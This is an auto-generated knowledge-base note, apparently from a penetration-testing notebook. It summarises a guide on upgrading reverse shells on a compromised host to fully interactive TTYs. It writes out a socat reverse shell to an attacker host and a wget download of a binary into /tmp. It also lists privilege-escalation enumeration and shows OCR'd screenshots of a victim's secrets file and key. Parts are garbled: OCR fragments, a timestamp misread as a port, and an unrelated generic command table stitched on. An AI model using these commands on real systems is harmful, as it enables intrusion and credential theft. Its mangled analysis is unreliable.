---
title: "Trained Knowledge & Topology: Upgrading shells to fully interactive TTYs"
category: knowledge
domain_hub: "[[knowledge/06_linux_unix_administration_processes_and_logging]]"
os_platform: linux
primary_tactic: Passive_Enum
summary: "Operational architecture, decision workflows & Windows/Linux command reference for Upgrading shells to fully interactive TTYs: Linux (Debian/Ubuntu/CentOS/RHEL) and UNIX/Solaris system administration, kernel /proc & sysctl internals, ext4/xfs/procfs filesys"
when_to_apply: "Apply when working with Upgrading shells to fully interactive TTYs (linux): Apply when enumerating a Linux/UNIX/Solaris host, inspecting `/proc/<PID>` or kernel modules, auditing mounted filesystems (`findmnt`/`lsblk`), managing `systemd` services or signals, hunting SUID/SGID/Capabilities/sudo privilege escalation vectors, reviewing `/var/log`/`journalctl` logs, or upgrading a dumb shell to a full interactive TTY."
tags: [enumeration, https, initial_access_exploitation, mdp, msfvenom, pdf, post_exploitation_verification, privilege_escalation, protocol_chaining, socat, ssh, trained, linux, unix, solaris, systemctl, journalctl, lsof, strace, findmnt, lsblk, sysctl]
source_file: "Upgrading shells to fully interactive TTYs"
updated: 2026-10-30
---

# Trained Knowledge & Architecture: `Upgrading shells to fully interactive TTYs.pdf`

- **Source Path:** `~/Projects/CORA/Training/Upgrading shells to fully interactive TTYs.pdf` (`pdf`)
- **Extracted Technical Entities:** `https, msfvenom, socat, ssh`
- **Extracted IPs / Subnets:** `10.0.3.4, 10.0.3.7`
- **Extracted Interfaces:** `None`
- **Linked Command Playbook:** [[commands/trained_upgrading_shells_to_fully_interactive_ttys]] (`15` CEGAR-verified commands | `15` MDP transitions)

## Command & Tactic Coverage Summary
- **Total CEGAR-Verified Commands:** `15` (full executable list in [[commands/trained_upgrading_shells_to_fully_interactive_ttys]])
- **Tactic Distribution:** `Enumeration` (10), `Protocol_Chaining` (2), `Initial_Access_Exploitation` (1), `Post_Exploitation_Verification` (1), `Privilege_Escalation` (1)
- **Top Extracted CLI Tools:** `export` (3), `stty` (3), `nc` (2), `netcat` (2), `socat` (2), `cat` (1), `msfvenom` (1), `wget` (1)

### Visual & Network Diagram Intelligence (`Upgrading shells to fully interactive TTYs.pdf#page11`)
- **Diagram Ports / Services:** `:50`
- **Spatially Grouped Diagram Nodes (Box/Component Clusters):**
  1. `[www-data@precise64:/tmp$exportSHELL=bash | www-data@precise64:/tmp$exportTERM=xterm-256color | www-data@precise64:/tmp$sttyrows38columns116 | www-data@precise64:/tmp$id | www-data@precise64:/tmp$cd/etc/ | Display all 163 possibilities? (y or n)]`
  2. `[www-data@precise64:/tmp$cat | ~C | www-data@precise64:/tmp$sleep100 | [1]+Stopped | www-data@precise64:/tmp$:D]`
  3. `[~Z]`
  4. `[sleep100 | The possibilities are endless now. Tmux over a netcat shell?? Why]`
  5. `[not? :D | FileEditViewSearchTerminalHelp]`
  6. `[root@kali:~ | auth_key="db3974a97f2407b7cae1ae637c0030687a11913274d578492558e39c16c017de84eacdc8c62fe34ee4e12b4b1428817f09b6a276]`
  7. `[$id | $bash | www-data@precise64:~$ls | index.htmlsecrets.config | 0c3f8a664ceae94d2434a593" | www-data@precise64:~$]`
  8. `[uid=33(www-data）gid=33(www-data）groups=33(www-data) | www-data@precise64:~$ cat secrets.config]`
  9. `[[0]0:revshell*1:bash-2:vim]`
  10. `['precise64" 02:50 10-Jul-17]`

## LLM Distilled Operational Summary
### Operational Techniques & Decision Workflows

*   **Assess Shell Quality:** Determine if the reverse shell is "dumb" (non-interactive) by checking for missing features like `Ctrl-C` handling, tab completion, or history.
*   **Check for Native Tools:** Verify availability of `socat` or `python` on the victim host before attempting downloads.
*   **Fallback Strategy:** If native tools are missing, use command injection to download a static binary (e.g., `socat`) from a trusted repository.
*   **Upgrade Workflow:** Execute the appropriate upgrade command (Python `pty` or `socat`) to transform a non-interactive shell into a fully interactive TTY supporting `su`, `vim`, and job control.

### Critical Command Patterns & Required Flags

**Method 1: Python `pty` Module**
*   **Command:** `python -c 'import pty; pty.spawn("/bin/bash")'`
*   **Purpose:** Spawns a pseudo-terminal to enable basic TTY features (e.g., `su`), though it may not fully resolve `SIGINT` issues depending on the listener.

**Method 2: Using `socat`**
*   **Victim Side (Launch):**
    *   `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<KALI_IP>`
    *   **Flags:** `pty` (pseudo-terminal), `stderr` (redirect error streams), `setsid` (new session), `sigint` (handle Ctrl-C), `sane` (standard I/O).
*   **Kali Side (Listen):**
    *   `socat file:`tty`,raw,echo=0 tcp-listen:<PORT>`
    *   **Flags:** `file:`tty`` (bind to terminal), `raw` (raw mode), `echo=0` (disable echo).
*   **Download Fallback:**
    *   `wget -q <URL_TO_SOCAT_BINARY> -O /tmp/socat && chmod +x /tmp/socat`

### Network Topology & Relationships

*   **VICTIM Host:** IP `10.0.3.7` (Precise64 OS, user `www-data`).
*   **KALI Host:** IP `10.0.3.4` (Attacker machine).
*   **Service Relationship:** The workflow involves establishing a reverse TCP connection from VICTIM to KALI on a specified port (default `4444`).
*   **Diagram Port:** Port `:50` is noted in the visual intelligence section, potentially indicating a specific service or diagram reference point.
*   **User Context:** Operations often start as `www-data` (UID 33) and may escalate to `root` using tools like `su` once a TTY is established.

## Document Structure & Key Topics
- Visual & Network Diagram Intelligence (`Upgrading shells to fully interactive TTYs.pdf#page11`)
- In reverse shell
- In Kali

<!-- CORA-MAXIMIZED-COMMANDS-START -->
## Maximized Windows & Linux Command Examples for `Upgrading shells to fully interactive TTYs`

> **Domain Hub:** [[knowledge/06_linux_unix_administration_processes_and_logging|Domain Hub 06: Linux, UNIX & Solaris Administration, Kernel (/proc & sysctl), Filesystems, Boot/systemd, Processes, Permissions/SUID & Logging]]  
> **Master Playbooks:** [[commands/windows_master_command_playbook]] | [[commands/linux_master_command_playbook]] | [[commands/curl_playbook]] | [[commands/tio_serial_playbook]]  
> **When to Apply:** Apply when enumerating a Linux/UNIX/Solaris host, inspecting `/proc/<PID>` or kernel modules, auditing mounted filesystems (`findmnt`/`lsblk`), managing `systemd` services or signals, hunting SUID/SGID/Capabilities/sudo privilege escalation vectors, reviewing `/var/log`/`journalctl` logs, or upgrading a dumb shell to a full interactive TTY.  
> **15-Engine H-MDP State Transition:** `s_init_unknown` $\xrightarrow{\text{Passive_Enum}}$ `s_interactive_tty_or_priv_escalated` | **Bayesian Root-Cause Triggers:** `suid_or_capability_privesc_vector, writable_systemd_or_cron_script, unlinked_proc_binary_execution, dumb_shell_missing_pty` | **Isolation:** `RED, BLUE, WHITE (100% local host telemetry compatible)`

| Primary Command (`Windows` / `Linux`) | OS / Shell | What It Does & Key Flags | When to Apply & Expected Output | Cross-Platform Equivalent |
| :--- | :--- | :--- | :--- | :--- |
| `uname -a; cat /etc/os-release; hostnamectl; uptime; id` | **Linux Bash** | Collects kernel version, architecture, OS distribution, hostname, system load, and current user UID/GID/groups (`[[commands/trained_centos-debian-survey]]`). | Apply first on any Linux/UNIX system (`s_init_unknown`) to establish OS and privilege baseline. | `systeminfo && whoami /all` |
| `ps auxef && ps -eo pid,ppid,user,stat,lstart,args --forest` | **Linux Bash** | Displays full process tree (`--forest`), UID, PID, PPID, start timestamp, and full command line (`[[commands/trained_cqc001_e050_m050_process_and_signals]]`). | Apply to identify running daemons, abnormal child processes, or processes executing from `/tmp` or `/dev/shm`. | `wmic process get ProcessId,ParentProcessId,ExecutablePath,CommandLine` |
| `sudo ls -la /proc/<PID>/exe /proc/<PID>/cwd /proc/<PID>/fd && tr '\0' '\n' < /proc/<PID>/environ` | **Linux Bash** | Inspects the live kernel `/proc/<PID>` binary link (`exe`), working directory (`cwd`), open descriptors (`fd`), and environment variables (`environ`). | Apply during Linux live forensics: recovers deleted binaries (`cp /proc/<PID>/exe /tmp/recovered`) and exposes secrets in process environments. | `handle -accepteula -a -p <PID>` |
| `systemctl list-units --type=service --state=running && systemctl list-timers --all` | **Linux Bash** | Lists all active `systemd` services and scheduled timers (`[[commands/trained_cqc001_e050_m040_boot_init_login]]`). | Apply to audit running services and periodic scheduled tasks on modern `systemd` distributions. | `sc query state= active && schtasks /query` |
| `df -hT && lsblk -f && findmnt` | **Linux Bash** | Lists mounted filesystems with filesystem type (`ext4`, `xfs`, `tmpfs`), block device hierarchy, UUIDs, and mount flags (`noexec`, `nosuid`) (`[[knowledge/trained_cqc001_e050_m030_filesystems]]`). | Apply to inspect storage layout and verify which writable directories (`/tmp`, `/var/tmp`, `/dev/shm`) allow binary execution. | `wmic logicaldisk get DeviceID,FileSystem,FreeSpace,Size` |
| `sudo -l && find / -perm -4000 -type f -exec ls -la {} + 2>/dev/null && getcap -r / 2>/dev/null` | **Linux Bash** | Audits allowed `sudo` commands, SUID root binaries (`-perm -4000`), and POSIX file capabilities (`getcap -r /`) (`[[commands/trained_cqc001_e060_m010_users_and_permissions]]`). | Apply immediately during Linux privilege escalation (`s_initial_shell_or_api_access -> s_interactive_tty_or_priv_escalated`). | `whoami /priv && accesschk -accepteula -uwcqv *` |
| `find / -writable -type f \( -path "/etc/*" -o -path "/usr/*" -o -path "/opt/*" -o -path "/var/spool/cron/*" \) 2>/dev/null` | **Linux Bash** | Finds misconfigured world- or group-writable config files, service units, and scripts across system directories. | Apply to detect writable `/etc/passwd`, `/etc/systemd/system/*.service`, or cron jobs executed by root. | `accesschk -accepteula -uwqv "Users" C:\Windows\*` |
| `journalctl -xe --no-pager -n 100 && sudo grep -E "Accepted\|Failed\|sudo\|session opened" /var/log/auth.log /var/log/secure 2>/dev/null \| tail -n 50` | **Linux Bash** | Queries `systemd-journald` and `rsyslog` auth logs (`auth.log` on Debian/Ubuntu, `secure` on RHEL/CentOS) (`[[commands/trained_logging-cmds]]`). | Apply when auditing SSH logins, `sudo` usage, or service startup failures. | `wevtutil qe Security /c:30 /rd:true /f:text` |
| `python3 -c 'import pty; pty.spawn("/bin/bash")' \|\| script -qc /bin/bash /dev/null` | **Linux Bash** | Allocates a kernel pseudo-terminal (`PTY`) to upgrade a non-interactive netcat/reverse shell into a full interactive TTY (`[[knowledge/trained_upgrading_shells_to_fully_interactive_ttys]]`). | Apply whenever `sudo`, `su`, `ssh`, or `vim` fails with `standard in must be a tty` or `no tty present`. | `Enter-PSSession` |
| `uname -a; showrev -p; ifconfig -a; netstat -rn; ps -ef; svcs -a` | **Solaris / UNIX** | Solaris (`SunOS`) system, patch (`showrev -p`), interface (`ifconfig -a`), routing (`netstat -rn`), and SMF service (`svcs -a`) survey (`[[commands/trained_solaris-survey]]`). | Apply when operating on legacy Solaris / SunOS UNIX enterprise servers. | `systeminfo && ipconfig /all && sc query` |

### Copy-Pasteable Execution Block (Windows & Linux)
```bash
# [Linux Bash] Collects kernel version, architecture, OS distribution, hostname, system load, and current user UID/GID/groups (`[[commands/trained_centos-debian-survey]]`).
uname -a; cat /etc/os-release; hostnamectl; uptime; id
# [Linux Bash] Displays full process tree (`--forest`), UID, PID, PPID, start timestamp, and full command line (`[[commands/trained_cqc001_e050_m050_process_and_signals]]`).
ps auxef && ps -eo pid,ppid,user,stat,lstart,args --forest
# [Linux Bash] Inspects the live kernel `/proc/<PID>` binary link (`exe`), working directory (`cwd`), open descriptors (`fd`), and environment variables (`environ`).
sudo ls -la /proc/<PID>/exe /proc/<PID>/cwd /proc/<PID>/fd && tr '\0' '\n' < /proc/<PID>/environ
# [Linux Bash] Lists all active `systemd` services and scheduled timers (`[[commands/trained_cqc001_e050_m040_boot_init_login]]`).
systemctl list-units --type=service --state=running && systemctl list-timers --all
# [Linux Bash] Lists mounted filesystems with filesystem type (`ext4`, `xfs`, `tmpfs`), block device hierarchy, UUIDs, and mount flags (`noexec`, `nosuid`) (`[[knowledge/trained_cqc001_e050_m030_filesystems]]`).
df -hT && lsblk -f && findmnt
# [Linux Bash] Audits allowed `sudo` commands, SUID root binaries (`-perm -4000`), and POSIX file capabilities (`getcap -r /`) (`[[commands/trained_cqc001_e060_m010_users_and_permissions]]`).
sudo -l && find / -perm -4000 -type f -exec ls -la {} + 2>/dev/null && getcap -r / 2>/dev/null
```
<!-- CORA-MAXIMIZED-COMMANDS-END -->
